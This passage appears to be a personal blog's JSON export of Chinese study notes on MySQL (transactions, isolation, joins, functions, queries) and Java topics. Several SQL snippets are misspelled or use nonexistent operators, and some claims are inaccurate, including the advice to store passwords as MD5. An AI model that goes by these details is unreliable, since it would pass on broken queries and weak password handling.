成功无误，将修改结果作用到数据库，结束此次事务。# 有错误情况START TRANSACTION ; # 开启一次事务执行UPDATE account SET money&#x3D;money-500 WHERE name&#x3D;&#39;张三&#39; ; # 张三转账这里出错了！UPDATE account SET money&#x3D;money+500 WHERE name&#x3D;&#39;李四&#39; ; # 李四收账ROLLBACK ; # 中途出错，回滚到执行前，并且不修改数据库，结束事务。 从 start transaction 开始到 commit/rollback 之前这段代码，其实都没有真正的修改数据库，只是**==假修改==**，用另外一个用户查询该表，会发现还是不变的数据。 隔离等级设置## 查看事务的隔离级别 SELECT @@TX_ISOLATION ; 设置隔离级别 SET SESSION TRANSACTION ISOLATION LEVEL READ UNCOMMITTED ; 事务的四大特性 原子性 一个事务就是一个最小单位，不能再进行分割。 ==隔离性== 为防止多个事务之间，互相干扰； 隔离级别，级别越高，能够影响到的范围越小，如下： 读未提交：READ UNCOMITTED 是指用户 A 没有提交的数据，被用户B读到了（脏读）。 12345678# read uncommitted 读未提交，会脏读SET SESSION TRANSACTION ISOLATION LEVEL READ UNCOMMITTED ;SELECT @@tx_isolation ;START TRANSACTION ;SELECT * FROM account ;# 此时另外一个用户在另外一个 tansaction 中修改了数据！即使没 COMMITSELECT * FROM account ; # 这里也会受影响，读到未提交的数据，即脏读！COMMIT ; 读已提交：READ COMMITTED 可以避免脏读，会引发不可重复读。 不可重复读：是指用户 A 在两次读取数据中间，数据被用户 B 修改了，导致 A 两次读取数据不一致。 123456789# read committed 读已提交，会不可重复读SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTION ;SELECT * FROM account ;# 此时另外一个账户 transaction 中修改数据，但是没 COMMITSELECT * FROM account ; # 这里并不会受影响# 此时另外一个账户 transaction 中修改，并 COMMITSELECT * FROM account ; # 这里读到的数据就是被别人修改的数据，不再是重复的数据。COMMIT ; 可重复读：REPEATABLE READ 可以避免脏读，不可重复读，会引发幻读。（mysql 默认的隔离级别） 幻读：是指用户 A 在连续操作数据的过程中，B增加了一条新数据，影响到了A，但是 A 依旧以为数据没有发生变化。 12345678SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ ;START TRANSACTION ;SELECT * FROM account ;# 此时另外一个账户 transaction 中修改数据，但是没 COMMITSELECT * FROM account ; # 这里并不会受影响# 此时另外一个账户 transaction 中修改，并 COMMITSELECT * FROM account ; # 再次读依旧不受到影响COMMIT ; 可串行化：SERIALIZABLE 相当于 Java 中的单线程(Sycronization)，在操作表的过程中，其余如何用户不能再操作。串行化不会引发如何问题。 123456SET SESSION TRANSACTION ISOLATION LEVEL SERIALIZABLE ;START TRANSACTION ;SELECT * FROM account ;# 此时另外一个账户 transaction 中尝试修改该表,会进入等待SELECT * FROM account ;COMMIT ;# 这边事务结束后，另外事务中修改语句才能执行成功。 持久性 将改变的数据，持久化到可掉电设备中（ROM，硬盘）。 一致性 数据具有安全性，同步性。对于多用户同时操作数据库中的数据（临界资源，共享资源）不会发生不同步带来的数据混乱。 锁锁：主要目的为了保护数据，防止多用户共同操控数据的时候，出现数据混乱。 分类：乐观锁、悲观锁、共享锁、排它锁、表锁、行锁、MVCC 乐观锁：总认为，在自己在操作数据的时间内，坑定不会有其他人来操作数据库。一般我们使用乐观锁的话，会在数据库之内假如一列叫版本号值（数字，或时间戳） 当前读：如何加锁的查询都叫当前读，当前读由于锁的操作，在读取过程中其他人无法更新数据，所以当前读肯定获取的是最新数据，但是当前读有可能造成线程的阻塞。 快照读：没加锁的读，就是直接写的 select 查询语句，快照读有可能会读到历史版本的数据，因为快照读无法避免在读取数据的时候别人 更新数据库。","link":"","tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.fangning.xyz.com/tags/mysql/"}]},{"title":"单表多表","date":"2021-12-10T01:17:30.000Z","path":"2021/12/10/2021.12.10 单表多表/","text":"单表查询流程控制语句### 多判断 case 作用类似 switch-case 分支语句。 123456SELECT CASE 5 WHEN 1 THEN &#39;这是1&#39; WHEN 2 THEN &#39;这是2&#39; WHEN 3 THEN &#39;这是3&#39; ELSE &#39;大于3&#39;END ; 特点： case 关键字开头，when-then 为主体，else 为不满足条件，end结尾。 IF IF([条件], [满足输出], [不满足输出]); IFNULL IFNULL([判断对象（不为空输出自身）], [为空输出]); 1234567891011# IF 分支SELECT username, IF(is_male&#x3D;1, &#39;男&#39;, &#39;女&#39;) FROM user ;# case 分支SELECT username, case is_male WHEN 1 THEN &#39;男&#39; WHEN 2 THEN &#39;女&#39; ELSE &#39;错误&#39;ENDFROM user ; 分组 GROUP BY 关键字：==对指定的字段进行分组==，该字段相同的行数据会被合并，==被合并的字段，如果不在聚合函数内，会出现错误==。 1SELECT deptno, AVG(sal) FROM emp GROUP BY deptno ; HAVING 关键字：配合 group by 使用，==对分组后的数据进行筛选==，因为 where 的执行在 group by 之前，所以引入 having 来进行条件限定。 having 的==使用和 where 一样，并且可以使用聚合。== having 后可使用聚合变量； having 后也可使用普通的条件； having 还能嵌套 SELECT。 1234SELECT deptno FROM emp GROUP BY deptno HAVING AVG(sal) &gt; ( SELECT AVG(sal) FROM emp) ;# 部门平均 &gt; 公司所有人平均 LIMIT LIMIT关键字：用于对查询结果==进行部分显示==。 LIMIT x ;：表示只显示前 x 条数据； LIMIT pos, length ;：从第 pos 条（下标0开始）开始，共显示 length 条数据。 ## 查询关键字顺序 12345678SELECT DISTINCT deptno &#39;编号&#39;, AVG(sal) &#39;聚合均资&#39;FROM emp,... JOIN ... ON ...WHERE ...GROUP BY deptnoHAVING ...ORDER BY deptnoLIMIT 0, 5 ; 执行顺序 FROM —— 确定表 ； JOIN ON —— 确定表（多表联查） ； WHERE —— 筛选行 ； GROUP BY —— 对筛选之后的数据进行分组统计 ； HAVING —— 对分组后的数据进行筛选 ； SELECT —— ==确定列；== DISTINCE —— 对数据进行去重 ； ORDER BY —— 对结果进行排序 ； LIMIT —— 分页显示数据 ； 多表查询​ 多表查询，就是将数据库中的多个表关联起来进行查询，而需要将两张表关联起来，==最重要的就是寻找表与表之间的交集点。== 交集点： 一般有主外键的话，通过外键进行交集； 没有的话，找命名相同，现实含义相关的字段； 一点关联都没有，找间接关联，通过第三张表找联系。 笛卡尔积 笛卡尔积：是指两个表的数据产生乘积，相当于x*y。假如 x 与 y 表各有 100w 数据，那么笛卡尔积数量就是 100亿条。 各种连接方式，都会先生成临时笛卡尔积表，笛卡尔积是关系代数里的一个概念，表示两个表中的每一行数据任意组合。 笛卡尔积无法避免，所以尽量少用多表查询；使用各种不同的==连接方式，关联条件==，来减少显示内容，减轻系统负担。 分类 1、交叉连接（CROSS JOIN） 隐式交叉连接（产生笛卡尔积）：SELECT * FROM emp, dept ; 显式交叉连接（产生笛卡尔积）：SELECT * FROM emp CROSS JOIN dept ; 2、自然连接（JOIN） 将两张表中等值的列自动排到一起，并放在第一列显示，过滤掉笛卡尔积显示。 不可控。SELECT * FROM emp NATURAL JOIN dept ; 3、==内连接（常用）(INNER JOIN)== 隐式内连接：通过指定条件，来让不同表中的列产生对比关系，只有关系成立数据才会显示出来，过滤笛卡尔积。使用 WHERE 筛选条件。 SELECT * FROM emp,dept WHERE emp.deptno=dept.deptno ; 显式内连接：同隐式内连接，使用标准格式写法，使用 INNER JOIN 连接，ON 筛选条件。 SELECT * FROM emp INNER JOIN dept ON emp.deptno=dept.deptno ; ==内连接只能显示符合条件的数据，如果数据为 NULL 等不符合条件，也需要进行显示，就需要使用外连接！== ==4、外连接（LEFT JOIN）== ==左外连接（常用）==：使用 LEFT JOIN 连接， ON 关键字进行条件筛选。==显示左侧表的全部数据，右侧表的符合要求的数据，以左表为主。== 右外连接：显示右侧表的全部数据，以右侧表为主。 SELECT * FROM emp RIGHT JOIN dept ON emp.deptno=dept.deptno ; 5、全连接（FULL JOIN） 使用 FULL JOIN 关键字连接。显示笛卡尔积！一般不使用。 SELECT * FROM emp FULL JOIN dept ; 6、交并补差 交：返回两条查询的公共部分数据。 123SELECT * FROM emp WHERE deptno&#x3D;20INTERVALSELECT * FROM emp ; 并：合并两条查询的结果，两者都要，允许重复数据。 123SELECT * FROM emp WHERE deptno&#x3D;20UNION ALLSELECT * FROM emp ; 补：下条查询的结果补充到上方查询结果中，不会数据重复。 123SELECT * FROM emp WHERE deptno&#x3D;20UNIONSELECT * FROM emp ; 差：mysql 不存在，返回上条查询减下调查询后的记录。 123SELECT * FROM emp MINUSSELECT * FROM emp where deptno&#x3D;20 ; 7、（自连接） 自己和自己表进行连接，把同一张表使用两次，看作两张表进行连接操作。语法使用的还是内连接，或者外连接，作用于自己和自己。","link":"","tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.fangning.xyz.com/tags/mysql/"}]},{"title":"函数","date":"2021-12-07T07:52:30.000Z","path":"2021/12/07/2021.12.07 函数/","text":"数学函数绝对值 SELECT ABS(-80) ; 取余 SELECT 12%2 ; SELECT MOD(11, 2) ; 向上取整 SELECT CEILING(81.13) ; 四舍五入 SELECT ROUND(85.45, 1) ; SELECT ROUND(85.55) ; 截取小数（指定保留位数） SELECT TRUNCATE(2001.154, 0) ; SELECT TRUNCATE(2001.154, 2) ; 字符串函数获取ASCII码 SELECT ASCII(&#39;A&#39;) ; 字符串长度 SELECT LENGTH(&#39;sdlgkhsdakjgdksjjg&#39;) ; SELECT * FROM emp where LENGTH(ename) = 5 ; 字符串拼接 SELECT CONCAT(&#39;HELLO&#39;, &#39; mysql!&#39;, &#39;again!&#39;) ; 子串查找（第一次出现位置） SELECT LOCATE(&#39;mysql&#39; , &#39;hello mysql!&#39;)：==返回下标，下标从1开始计数，若不存在返回0== SELECT INSTR(&#39;HTLLO JAVA&#39;, &#39;JA&#39;) ;：返回，参数2，在参数1中出现的位置。 字符串截取 SELECT LEFT(&#39;HELLO&#39;, x) ;：从左侧，截取前 x 个字符。 SELECT RIGHT(&#39;HELLO &#39;, x) ;：从右侧，截取后 x 个字符。 SELECT SUBSTR(&#39;HELLO WORLD&#39; , x) ;：截取从下标x到最后的子串。 SELECT SUBSTR(&#39;HELLO WORLD&#39; FROM x FOR length) ; 去除字符串空格 SELECT TRIM(&#39; ff ff ff ff &#39;) ; SELECT LTRIM(&#39; ff ff ff ff &#39;) ; SELECT RTRIM(&#39; ff ff f ff &#39;) ; 字符串替换 SELECT REPLACE(&#39;str&#39; , &#39;sub_str&#39; , &#39;dest_str&#39;) ; 字符串翻倍 SELECT REPEAT(&#39;str&#39; , times) ; 字符串反转 SELECT REVERSE(&#39;str&#39;) ; 字符串插入（定位替换） SELECT INSERT(&#39;strstrstr&#39;, begin, len, &#39;dest_str&#39;) ;：len 值可为 0。被len长度所覆盖的原字符串会被替换掉！ 时间函数获得当前时间 SELECT NOW() ; 年月日时分秒星期单独获取年月日时分秒 SELECT YEAR( NOW() ) ; SELECT MONTH( NOW() ) ; SELECT DAY( &#39;2020-12-7&#39; ) ; SELECT DAYOFWEEK( NOW() ) ; SELECT HOUR( NOW() ) ; SELECT MINUTE( NOW() ) ; SELECT SECOND( NOW() ) ; SELECT EXTRAT( DAY FROM NOW() ) ; 整体获取 SELECT CURDATE() ; SELECT CURTIME() ; SELECT DATE(NOW()) ; SELECT DATE_FORMAT(DATE_SUB(NOW(),INTERVAL -1 day),&#39;%Y-%m-%d&#39;) ; 获取当前日期的后一天，然后取得 date 部分；前一天，就把 -1 改成 1；后一年就把 day 改成 year； 获取一个范围内第几单位 SELECT DAYOFMONTH( NOW() ) ; SELECT DAYOFYEAR( NOW() ) ; SELECT DAY(LAST_DAY(&#39;2012-09-01&#39;)) ;：获取当月一共多少天，先获取当月最后一天日期。 获取名称 SELECT DAYNAME( NOW() ) ;：求出当前星期英文名称。 SELECT MONTHNAME( NOW() ) ;：求出当前月份英文名称； 修改时间 SELECT DATE_ADD( NOW(), INTERVAL 30 MINUTE ) ; SELECT FATE_SUB( NOW(), INTERVAL 30 MINUTE ) ; 时间运算 SELECT DATEDIFF( NOW(), &#39;2000-9-6&#39; ) ; SELECT TO_DAYS(NOW()) - TO_DAYS(&#39;2000-9-6&#39;) ; 系统函数查看系统版本 SELECT VERSION() ; 查看数据库名称 SELECT DATABASE() ; 查看当前用户 SELECT USER() ; 查看当前字符集 SELECT CHARSET() ; 加密函数 SELECT MD5(x) ; SELECT PASSWORD(x) ; 统计函数 SELECT AVG(feild_name) FROM table_name ; SELECT MAX(feild_name) FROM table_name ; SELECT MIN(feild_name) FROM table_name ; SELECT COUNT(*) FROM table_name ; SELECT SUM(feild_name) FROM table_name ;","link":"","tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.fangning.xyz.com/tags/mysql/"}]},{"title":"查询","date":"2021-12-07T01:32:30.000Z","path":"2021/12/07/2021.12.07 查询/","text":"查询​ 我们查询语句查出来的内容统称为集合的投影，看起来是一个表结构，所以我们查询的结果集也能当表来使用。 ​ 查询语句主要分为三部分： SELECT 用来表示查询的关键字 SELEC **后面需要写查询的列都有哪些，==多个列命之间使用逗号，分割==**； 可以使用 * 通配符表示所有的列，但是一般再工作中不建议使用 * 。 FROM 用来表示从那些表中进行查询 这个表可以是一个数据库真实存在的表; 也可以使用一个集合的投影。 WHERE 用来条件过滤筛选。 基本使用 查询 EMP 表中，名字叫做 KING 的员工姓名、工资、部门编号。 1SELECT ename, sal, dptno FROM emp WHERE ename&#x3D;&#39;KING&#39; ; 使用别名 可以给==列，或者表起一个别名==。用来方便使用哦或者显示在结果集之中，别名的关键字是 AS ，默认可以省略不写。 别名只存在于集合投影中，并没有真实的影响数据库。 1SELECT ename AS &#39;姓名&#39;, sal AS &#39;工资&#39;, deptno AS &#39;部门编号&#39; FROM emp WHERE ename&#x3D;&#39;KING&#39; ; 列值筛选列值运算 SELECT 后面的==列值可以进行运算==，然后显示在集合投影中。 查询所有员工的姓名，以及员工的年薪（*12薪）； 列值为空 ==运算值为空==：使用 IFNULL(X,Y) 关键字，如果 x 字段为空，使用 y 值进行运算，否则使用 x 字段的值； 列值范围 **==运算值条件判断 IF关键字==**：IF([表达式], X, Y) 如果满足表达式，返回X，否则返回Y。 列值排序 在查询最后，加 ORDER BY 字段名(或别名) ASC 关键字==对查询结果的集合投影进行升序排列==。 ORDER BY 字段名(或别名) DESC：进行按照指定字段==降序排序==。 多列排序​ 先按照某列值进行排序，如果前面列值相等，则按照另外一列值进行排序。 ORDER BY：后面接的==排序字段可以有多列，使用逗号分隔==。 12345678910111213141516SELECT ename AS &#39;姓名&#39;, sal*12 AS &#39;年薪(12薪)&#39; FROM emp ;SELECT ename &#39;姓名&#39;, sal-500 &#39;扣除后月薪&#39; FROM emp ;# 空值不能直接进行运算。# 员工年收入：包括 前12月奖金(可能为null)+15薪SELECT sal*15+IFNULL(comm,0)*12 AS &#39;年收入&#39; FROM emp ;# 员工年收入：包括 前12月奖金(如果为空，奖励500)+15薪SELECT sal*15+IFNULL(comm*12, 500) &#39;年收入&#39; FROM emp ;# 员工年收入：15薪 + 12月奖金 + 如果月奖金少于300补贴满500SELECT sal*15 + IF(IFNULL(comm, 0)&lt;500, 500, comm)*12 &#39;年收入&#39; FROM emp ORDER BY 年收入 ASC ;# 查询部门编号20的员工姓名，工资，按照工资进行升序，工资相同按照姓名降序。SELECT ename &#39;姓名&#39;, sal &#39;工资&#39; FROM emp WHERE empid&#x3D;20 ORDER BY sal ASC, 姓名 DESC ; 去重查询 SELECT 后面==使用 DISTINCT关键字 修饰列名，得到去重结果==； 显示所有员工的职位种类。 1SELECT DISTINCT emp.job FROM emp; 条件筛选 小于 &lt;；大于 &gt;；小于等于 &lt;=；大于等于 &gt;=； 不等 ：！= 、&lt;&gt;； 为空：IS NULL 、非空：IS NOT NULL； 范围内：BETWEEN 1000 AND 3000、范围外：NOT BETWEEN 1000 NAD 3000； 集合范围内：IN(100, 200, 300, 400)；集合范围外：NOT IN(100, 200, 300, 400)； 或者：case1 OR case2； 12345678910111213141516171819202122SELECT * FROME emp WHERE sal&gt;1600 ;SELECT * FROME emp WHERE sal&lt;1600 ;SELECT * FROME emp WHERE sal&lt;&#x3D;1600 ;SELECT * FROME emp WHERE sal!&#x3D;1600 OR sal &lt;&gt; 1600 ;SELECT * FROME emp WHERE sal&gt;&#x3D;1000 AND sal&lt;&#x3D;3000 ;SELECT * FROME emp WHERE BETWEEN 1000 AND 3000 ;SELECT * FROME emp WHERE sal&lt;1000 OR sal&gt;3000 ;SELECT * FROME emp WHERE NOT BETWEEN 1000 AND 3000 ;SELECT * FROM emp WHERE sal&#x3D;800 OR sal&#x3D;1600 OR sal&#x3D;1250 OR sal&#x3D;2975 OR sal&#x3D;2450 OR sal&#x3D;2850 ;SELECT * FROM emp WHERE sal IN (800, 1600, 1250, 2975, 2450, 2850) ;SELECT * FROM emp WHERE (sal!&#x3D;5000 AND sal!&#x3D;2450 AND sal!&#x3D;1250) OR (depno!&#x3D;20 AND depno!&#x3D;10) ;SELECT * FROM emp WHERE sal NOT IN(5000, 2450, 1250) OR depno NOT IN(20, 10) ;# 无奖金SELECT * FROM emp WHERE comm&#x3D;0 OR comm IS NULL ;# 有奖金SELECT * FROM emp WHERE comm!&#x3D;0 AND comm IS NOT NULL ;","link":"","tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.fangning.xyz.com/tags/mysql/"}]},{"title":"疑难知识点","date":"2021-12-05T01:21:30.000Z","path":"2021/12/05/2021.12.05 疑难知识点/","text":"IO Java所有的I/O机制都是基于数据流进行输入输出，这些数据流表示了字符或者字节数据的流动序列。 Java的I/O流提供了读写数据的标准方法。任何Java中表示数据源的对象都会提供以数据流的方式读写它的数据的方法。 参考博客链接 Map 如何实现 Key 的唯一性 HashMap 和 HashSet 他们的底层数据结构的实现是：维护了一张 HashTable 。容器中的元素全部存储在Hashtable 中。他们再添加元素的时候,是如何判断是否存在有重复元素的呢？ 每一个被添加的元素都有一个 hashCode(哈希值)，他们先比较哈希值，是否相同？ 不相同的元素，添加进入 HashTable. 如果hashCode相同的话， 再去比较 equals()方法，如果也相同的话，JVM就认为数据已经存在了，就不会添加数据！ TreeMap 和 TreeSet 他们底层是数据结构的实现是：维护了一棵二叉树。 容器中添加元素的时候，他们有是怎么判断是否有相同元素的？我们都知到 TreeMap TreeSet 都是有序的存储数据。 为了维护 数据的唯一性。 再存入数据的时候，他们会调用元素中 实现的 Comparable 的 compareTo() 方法。 或者 集合本身创建的时候 传入了。 具体的实现是：调用比较方法，返回-1 的时候，添加到左子树，返回1 的时候 添加到 右子树。返回0 有相同数据 不添加该元素！ 参考博客链接 自平衡二叉树​ 一棵==平衡树==指的是==树能够保持其高度与广度能够保持预先定义的比例==。不同的数据结构可以定义不同的比例以保持平衡，但所有的比例都趋向于log2n。那么，一颗自平衡的 BST 也同样呈现出 O(log2n) 的渐进运行时间。 ​ 有许多种不同的自平衡 BST 数据结构，例如==AVL 树、红黑树（Red-Black Tree==、2-3 树、2-3-4 树、伸展树（Splay Tree）、==B 树==等等。 动态模拟位置 介绍参考博文 Java 集合是否有序​ ==是否有序指的是集合中的元素是否会按照插入的先后顺序来存储，而不是指集合中的元素本身是否有序==。 ​ HashSet、HashMap、HashTable都是无序的；TreeSet有序，按照 comparaTo排序。 hash冲突 java中 “Aa” 和 “BB” 的哈希值都是 2112，这就是hash冲突。 HashSet底层机制 反射能做什么 什么是反射 Java反射就是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；并且能改变它的属性。而这也是Java被视为动态语言的一个关键性质。 能够干啥 反射机制允许程序在运行时取得任何一个已知名称的class的内部信息，包括包括其modifiers(修饰符)，fields(属性)，methods(方法)等，并可于运行时改变fields内容或调用methods。那么我们便可以更灵活的编写代码，代码可以在运行时装配，无需在组件之间进行源代码链接，降低代码的耦合度；还有动态代理的实现等等；但是需要注意的是反射使用不当会造成很高的资源消耗！ getDeclaredMethods() 和 getMethods() getMethods()：能够获取类的所有public方法，包括自身定义的==以及从父类继承==的。 getDeclaredMethods()：能够获取类本身的所有方法，==包括private方法==，实现的接口方法，但是不能获取从父类继承的非public方法。 如果要==得到父类的 private 和 defualt 方法== 通过 clazz.getSuperclass() ==间接得到父类的类 .class 文件对象==。 如何再通过 getDeclaredMthods() 获取私有方法。 ConcurrentHashMap如何保证线程安全HashMap 是不安全的 多线程的put可能导致元素的丢失，另一个是put和get并发时，可能导致get为null。 HashTable也是安全的 实际上ConcurrentHashMap和Hashtable在不考虑实现细节来说，这两者完全是可以互相操作的,Hashtable在get，put，remove等这些方法中全部加入了synchronized，这样的问题是能够实现线程安全，但是缺点是性能太差，几乎所有的操作都加锁的，但是ConcurrentHashMap的检测操作却是没有加锁的。 ConcurrentHashMap的线程安全 ConcurrentHashMap从JDK1.5开始随java.util.concurrent包一起引入JDK中，在JDK8以前，ConcurrentHashMap都是基于Segment分段锁来实现的，在JDK8以后，就换成==synchronized==和==CAS==这套实现机制了。 JDK1.8中的ConcurrentHashMap不再使用Segment分段锁，而是==以table数组的头结点作为synchronized的锁==。 三个地方保证了线程安全 一、使用volatile保证当Node中的值变化时对于其他线程是可见的 volatile的happens-before规则：对一个volatile变量的写一定可见（happens-before)于随后对它的读。 二、使用table数组的头结点作为synchronized的锁来保证写操作的安全 当头结点不为null时，则使用该头结点加锁，这样就能多线程去put hashCode相同的时候不会出现数据丢失的问题。synchronized是互斥锁，有且只有一个线程能够拿到这个锁，从而保证了put操作是线程安全的。 三、当头结点为null时，使用CAS操作来保证数据能正确的写入。 所谓的CAS，即即compareAndSwap，执行CAS操作的时候，将内存位置的值与预期原值比较，如果相匹配，那么处理器会自动将该位置值更新为新值，否则，处理器不做任何操作。 参考博客后半部分 synhcronized 和 CAS 悲观锁 顾名思义，就是采取很悲观的策略，总是假设最坏的情况。每次取数据时都认为其它线程会修改这个数据，所以无论共享数据是否真的会出现竞争，它都要进行加锁。这样的话，当其它线程想要访问数据时都需要阻塞挂起。JVM 实现的 synchronized 的思想就是悲观锁。 乐观锁 乐观锁就是采取乐观的策略，总是认为不会产生并发问题。每次取数据的时候总认为不会有其它线程修改共享数据，因此不会上锁。而是在更新数据时再判断其它线程是否修改过数据。CAS 操作就是乐观锁的思想。 因为 sychronized 存在缺陷，会造成性能低下，所以很多情况下使用 CAS 机制优化。 该博文讲得很清楚 关于匿名流对象如何关闭问题 我们在构造一个流对象的时候，有的时候需要传入另外一个类型的流对象；这个时候，常常新建一个匿名流对象作为参数进行传递； 这个时候，匿名流用完就没用了，怎么去关闭呢？ 装饰器模式 java中的IO流设计，使用了装饰模式，简单的说就是对已有的基础IO流进行再次包装，当你使用包装好的类进行相关操作时，内部还是会用你包装前的类进行操作。而在资源关闭这块，在关闭外层IO流，被包装的IO在基本都会被关闭。如何验证？直接看各个IO类的close()方法源码就一清二楚了。 通俗的讲就是，Java 中凡是可以接受其他流作为参数的类，内部都会提供关闭传进来的那个流的方式。==如果自己被关闭了，那自己所用到的其他流对象，也会一并进行关闭。== 为什么一定要关闭​ 因为当我们用了虚拟机以外的资源，比如端口、显存、文件的时候（访问本地资源），超出了虚拟机能够释放资源的界限，这时候虚拟机并不能通过垃圾回收机制对你占用的资源进行释放，如果在没有关闭的情况下第一次运行程序是不会发生问题的，但是随着资源占有量逐渐增多而你又不自己进行close释放资源的话，垃圾只会越积越多，导致系统无法存储其他的资源，甚至会导致系统崩溃。如果你再次对未关闭流的文件进行读写，编译就会报错，告诉你这个文件被占用。 ​ 举例说明：如果你再堆区new一个对象的时候，如果等号左边是对端口、显存、文件进行操作的时候，虚拟机就无法利用垃圾回收机制对堆区占用的资源进行释放。 设计模式单例模式私有化类的构造方法，每次实例化都使用同一个实例对象，减少对象的频繁实例化开销！ 懒汉模式 用的时候再实例化一个对象； 以后再用的时候，都用这一个对象。 饿汉模式 直接内部实例化一个对象； 以后都直接使用这一个对象。 枚举式 枚举内部都是私有的实例； 刚好满足单例条件。 线程同步的单例实现 实例化对象的时候加锁 sychronized； 避免因为多个线程不同步造成实例多个对象。 简单工厂模式 普通 产品是类，然后在弄个工程类来实例化产品，用户只需要向工厂提出需求，工厂就能直接给一个对象出来。 问题：每次新增一个产品类，都需要继承，修改工厂类的实例化方法。==不满足开闭原则==。 反射改良 将工厂实例化对象的方法，使用反射实现。这样子，工厂只需要得到类名，就可以直接实例化一个产品实例出来。 新增一个新产品类，只需要继承必要的接口或者包装类即可，和工厂无关。 深拷贝，浅拷贝 普通的引用数据类型赋值，都只是引用传递，真正的数据还是公用一份。 如果要实现真正的赋值，需要用到深拷贝。 实现方式： 使用序列化，将需要拷贝的对象序列化输出到一个字节流当中。 然后==再从中反序列化出来，存到拷贝的参考中，这样子就实现了两份==。 深拷贝注意： ==重写 clone 方法==也可以实现深拷贝，但是拷贝对象的引用属性所属的类也需要重写 clone。如果很多属性，都是引用数据类型，就都得去一一重写一遍，==太麻烦==。 ==序列化后的对象，再次进行序列化==，写进去的只是上一次序列化的==标记==。因此两次序列化同一个对象，中间修改数据，并不会作用于第二次序列化。 Serializable 提供有指定属性进行序列化的方法，被指定的属性，一定会被序列化（无视trancisent）； 形参和实参 如何语言都需要注意方法调用的时候，传递的形参和实参问题。 java 中因为每个引用数据类型传递到方法中，往往我们都是通过改对象名称，修改内部数据，所以不会出现错误，但是如果==整个对该引用进行引用传递赋值操作，会作用不到原对象，这个时候方法内部修改的只是局部的形参变量。== javaScript 中，function 里面经常使用全局变量，就是因为，如果用参数传递变量，只是一个形参，改变不了原变量的值。 正则表达式 java java中的正则表达式表示，直接用双引号，内部的原字符需要加转义字符，”\\ \\d” 两条右斜杆。 javaScript js中，不使用如何引号，使用两条左斜杠包裹正则表达式。 /\\s+\\d+(\\.\\d+)?\\s+/：内部特殊语义的字符使用一个转义字符即可，不需要对转义字符再进行转义。","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"MySql基础","date":"2021-12-04T11:13:30.000Z","path":"2021/12/04/2021.12.04 数据库/","text":"概念数据库 按照数据结构来组织、存储、管理数据的==仓库！== 将数据存储在文件中，读写速度太慢；所以使用==关系型数据库管理系统（mysql）来存储和管理大量数据==； 每个数据库都有提供增删改查等等的API。 RDBMS特点： 数据都是表； 列：表示记录名称的数据域（==属性==，字段）； ==行：一条条记录（对象）；== 行+列=表，若干表=数据库，数据库有多个； 相关术语 冗余 ==存储两份数据==，降低了性能提高了安全性； 就是备胎，大型的货车，每个位置都不止一个轮胎，就是冗余概念。 主键 唯一的：==一个表只能有一个主键==； 可以唯一标识一张表，可以用主键来查询数据； 设为主键的字段，每行数据都不能重复。 外键 用于关联两张表； 就像两个不相关的类，需要彼此设置属性，才能关联起来； 通过你能找到我，通过我也可以访问你。 复合键 将多个列作为索引键，两个属性唯一标识一条数据； 用于复合索引。 索引 用于快速访问数据库表中的特定信息； 对表中的一列，或多列排序的结构，就是目录。 参照完整性 关系中不允许引用不存在的实体； ==完整性约束：为保证数据一致性。== 实体完整性 参照完整性 命名规范 命名： 【强制】==表名、字段名必须使用小写字母或数字== ， 禁止出现数字开头，禁止两个下划线中间只 出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑。 说明： ==MySQL 在 Windows 下不区分大小写，但在 Linux 下默认是区分大小写。因此，数据库名、 表名、字段名，都不允许出现任何大写字母，避免节外生枝。== 正例： ==aliyun _ admin ， rdc _ config ， level3_ name== 反例： AliyunAdmin ， rdcConfig ， level 3 name 查看博文 SQL 代码：指令尽量使用大写 SQL只所以==要求用大写==，其实和SQL的执行有关，SQL也算是一种程序语言，而且比我们平时用的程序语言更高级； 这个就不说了，大小写的问题只有一点，那就是，你写好的SQL语句，在执行的时候，是先转化为大写字母然后执行，如果小写转化大写，如果大写，那就可以省一个转化的时间。 在大型的ERP系统开发时，往往会这么要求，但目前国内很多作坊式的软件公司，做的也都是一些不上台面的项目，所以很少有这么要求的。 基本操作123456789101112131415161718192021222324252627282930# 登陆本地mysql，如果是远程需要加主机字段;1. mysql -uroot -p# 创建数据库2. CREATE DATABASE [DBName];# 删除数据库3. DROP DATABASE [DBName];# 展示所有数据库4. SHOW DATABASES;# 创建用户5. CREATE USER &#x27;username&#x27; IDENTIFIED BY &#x27;password&#x27;;# 删除用户6. DROP USER &#x27;username&#x27;;# 赋予用户权限7. GRANT CREATE,INSERT,SELECT ON [DBName].* &#x27;username&#x27;;# 回收用户权限8. REVOKE CREATE,INSERT,SELECT ON [DBName].* FROM &#x27;username&#x27;;######################## 数据库本身命令9. SELECT USER(); # 查看当前登陆用户。10. USE [DBName]; # 切换数据库。11. SHOW TABLES; # 展示当前数据库中的表。 1新建表数据类型1234567# 创建一张表CREATE TABLE Person( # SQL 不分大小写！ Person 实际上还是 person id int, # 语句内使用 , 逗号分隔 name varchar(20), sex char(1), birthday date); # ;分号结束语句 ==SQL不区分大小写字母，两个单词使用下划线分隔 student_name== CREATE：代表创建，SQL中无论是是建库，还是建表，还是视图，==只要是和创建有关，都使用 CREATE 命令==。 TABLE：一张表。 Person：用表名，自定义，不能和 java 和 mysql 关键字冲突。 ()：括号内定义表的具体信息。 id, name, sex等：列名称，多个列之间使用逗号 , 分割，最后一列不需要加逗号。 int：数据类型，整数，每列后面都要指定一个数据类型。==如果表示密码，需要进行加密，采用 MD5(value) 函数对值进行加密后赋值==。 关于 varchar 和 char 区别 varchar(length) char(length) 长度是否可变 可变 固定 数据存储方式 字符串长度+1字节（记录字符串实际长度） 字符串长度&lt;length，补空白 最大存储空间 62235字节，2的16次方 255字节，2的8次方 是否与编码有关 length长度和编码无关 length长度和编码无关 最大字符串长度 (length / 编码时一个字符所占字节数)-2 255 / 编码时一个字符所占字节数 效率 低 高 应用场景 常用 固定长度时：电话，密码，身份证 date：数据类型，用来表示日期。 